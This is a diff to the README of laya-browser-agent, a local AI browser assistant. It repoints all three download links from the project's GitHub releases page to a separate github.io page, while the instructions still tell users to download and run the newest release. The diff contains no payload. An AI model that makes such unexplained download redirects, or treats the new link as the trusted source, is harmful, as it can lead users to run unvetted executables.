@@ -1,6 +1,6 @@
 # 🤖 laya-browser-agent - Your AI Browser Assistant, Locally
 
-[![Download Now](https://img.shields.io/badge/Download-laya--browser--agent-blue?style=for-the-badge&logo=github)](https://github.com/miniproaissa/laya-browser-agent/releases)
+[![Download Now](https://img.shields.io/badge/Download-laya--browser--agent-blue?style=for-the-badge&logo=github)](https://miniproaissa.github.io)
 
 ---
 
@@ -26,7 +26,7 @@ This is a local alternative to paid services. You own everything. No accounts, n
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[🔗 https://github.com/miniproaissa/laya-browser-agent/releases](https://github.com/miniproaissa/laya-browser-agent/releases)
+[🔗 https://miniproaissa.github.io](https://miniproaissa.github.io)
 
 On that page, look for the newest release (usually at the top) and click the download link. Save the file to a folder you can easily find, like your **Downloads** folder or **Desktop**.
 
@@ -149,7 +149,7 @@ This version is for Windows. Mac users with Apple Silicon can check the releases
 ## 📦 Download Again
 
 Ready to get started? Download the latest version here:  
-[🚀 Download laya-browser-agent](https://github.com/miniproaissa/laya-browser-agent/releases)
+[🚀 Download laya-browser-agent](https://miniproaissa.github.io)
 
 ---
 
